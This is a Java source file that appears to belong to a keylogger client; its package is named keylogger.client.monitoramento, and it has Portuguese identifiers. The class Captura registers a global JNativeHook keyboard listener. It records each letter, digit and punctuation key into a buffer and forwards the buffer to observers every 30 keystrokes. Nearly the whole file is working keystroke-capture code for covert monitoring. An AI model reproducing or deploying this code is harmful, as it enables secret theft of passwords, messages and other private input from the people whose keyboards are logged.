package keylogger.client.monitoramento;

import java.util.LinkedList;
import java.util.List;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import keylogger.client.exceptions.NotImplementedYetException;
import keylogger.client.observerdesignpattern.Observer;
import keylogger.client.observerdesignpattern.Subject;

/**
 * "Feel the beat now,
 * If you've got nothing left say."
 * Good Charlotte.
 * 
 * @author Leonardo
 */
public class Captura implements NativeKeyListener, Subject {
	private String oQueFoiEscrito = "";
	private int letrasDigitadas = 1;
	private List<Observer> observers;
	private int maxChar;
	
	public Captura() {
		this.observers = new LinkedList<>();
		this.maxChar = 30;
	}
	
	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		if(this.letrasDigitadas == maxChar) {
			this.notifyObserver();
			this.letrasDigitadas = 0;
			this.oQueFoiEscrito = this.oQueFoiEscrito.substring(maxChar-1, this.oQueFoiEscrito.length());
		}
		
		switch(e.getKeyCode()) {
		case(NativeKeyEvent.VC_A):
			this.oQueFoiEscrito += "a";
			this.letrasDigitadas++;
		break;
		case(NativeKeyEvent.VC_B):
			this.oQueFoiEscrito += "b";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_C):
			this.oQueFoiEscrito += "c";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_D):
			this.oQueFoiEscrito += "d";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_E):
			this.oQueFoiEscrito += "e";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_F):
			this.oQueFoiEscrito += "f";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_G):
			this.oQueFoiEscrito += "g";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_H):
			this.oQueFoiEscrito += "h";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_I):
			this.oQueFoiEscrito += "i";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_J):
			this.oQueFoiEscrito += "j";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_K):
			this.oQueFoiEscrito += "k";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_L):
			this.oQueFoiEscrito += "l";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_M):
			this.oQueFoiEscrito += "m";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_N):
			this.oQueFoiEscrito += "n";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_O):
			this.oQueFoiEscrito += "o";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_P):
			this.oQueFoiEscrito += "p";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_Q):
			this.oQueFoiEscrito += "q";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_R):
			this.oQueFoiEscrito += "r";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_S):
			this.oQueFoiEscrito += "s";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_T):
			this.oQueFoiEscrito += "t";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_U):
			this.oQueFoiEscrito += "u";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_V):
			this.oQueFoiEscrito += "v";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_W):
			this.oQueFoiEscrito += "w";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_X):
			this.oQueFoiEscrito += "x";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_Y):
			this.oQueFoiEscrito += "y";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_Z):
			this.oQueFoiEscrito += "z";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_0):
			this.oQueFoiEscrito += "0";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_1):
			this.oQueFoiEscrito += "1";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_2):
			this.oQueFoiEscrito += "2";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_3):
			this.oQueFoiEscrito += "3";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_4):
			this.oQueFoiEscrito += "4";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_5):
			this.oQueFoiEscrito += "5";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_6):
			this.oQueFoiEscrito += "6";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_7):
			this.oQueFoiEscrito += "7";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_8):
			this.oQueFoiEscrito += "8";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_9):
			this.oQueFoiEscrito += "9";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_PERIOD):
			this.oQueFoiEscrito += ".";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_COMMA):
			this.oQueFoiEscrito += ",";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_SEMICOLON):
			this.oQueFoiEscrito += ";";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_UNDERSCORE):
			this.oQueFoiEscrito += "_";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_MINUS):
			this.oQueFoiEscrito += "-";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_SPACE):
			this.oQueFoiEscrito += "\n";
		break;
		case(NativeKeyEvent.VC_ESCAPE):
			this.oQueFoiEscrito = "exit";
			this.notifyObserver();
		}
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e){
		
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {

	}

	public String getoQueFoiEscrito() {
		return this.oQueFoiEscrito;
	}

	public int getLetrasDigitadas() {
		return letrasDigitadas;
	}

	public void setLetrasDigitadas(int letrasDigitadas) {
		this.letrasDigitadas = letrasDigitadas;
	}

	@Override
	public void addObserver(Observer o) {
		this.observers.add(o);
		
	}

	@Override
	public void removeObserver(Observer o) {
		this.observers.remove(o);
		
	}

	@Override
	public void removeObserver(int index) {
		this.observers.remove(index);
		
	}

	@Override
	public void notifyObserver() {
		for(Observer o: this.observers) {
			o.update(this.oQueFoiEscrito);
		}
	}
}
